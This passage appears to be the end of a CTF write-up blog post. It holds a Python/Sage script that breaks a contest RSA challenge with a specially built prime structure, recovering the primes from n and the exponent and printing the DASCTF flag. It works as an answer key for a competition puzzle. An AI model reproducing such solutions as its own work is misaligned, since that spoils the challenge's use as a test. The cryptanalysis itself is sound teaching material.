<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"><span class="comment">#print(e.bit_length())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认r和s的位数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for m in range(10):</span></span><br><span class="line"><span class="string">    print(m**2-m+2)</span></span><br><span class="line"><span class="string">    # 34/2=17</span></span><br><span class="line"><span class="string">    # 14 m=4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># factor(e) = 3*7*7*19*691*5741</span></span><br><span class="line"><span class="comment"># 因为是17位，所以就只可能是下面的情况</span></span><br><span class="line">r,s = <span class="number">5741</span>*<span class="number">3</span>*<span class="number">7</span>, <span class="number">691</span>*<span class="number">19</span>*<span class="number">7</span></span><br><span class="line">ab = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># a、b都比r和s大很多，于是就有n≈(a*b)^4, ab=iroot(n,4)[0]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">var(&#x27;a b&#x27;)</span></span><br><span class="line"><span class="string">f1 = a*b == ab</span></span><br><span class="line"><span class="string">f2 = n == (ab**4)+a**4*s+b**4*r+r*s</span></span><br><span class="line"><span class="string">print(solve([f1,f2],[a,b]))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">47783641287938625512681830427927501009821495321018170621907812035456872958654</span></span><br><span class="line">b = <span class="number">44416071018427916652440592614276227563515579156219730344722242565477265479486</span></span><br><span class="line">p=a**<span class="number">4</span>+r</span><br><span class="line">q=b**<span class="number">4</span>+s</span><br><span class="line"><span class="comment">#print(gcd(e//3, p-1))</span></span><br><span class="line">d = inverse(e//<span class="number">3</span>, p-<span class="number">1</span>)</span><br><span class="line">m_72 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f = a^e - m_72</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mps:</span><br><span class="line">    flag=long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/YCB/" class="tag">#YCB</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF%20%E7%AC%AC%E4%BA%8C%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">华为杯 第二届中国研究生网络安全创新大赛 Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/08/28/NSSCTF%202nd%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">NSSCTF 2nd Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>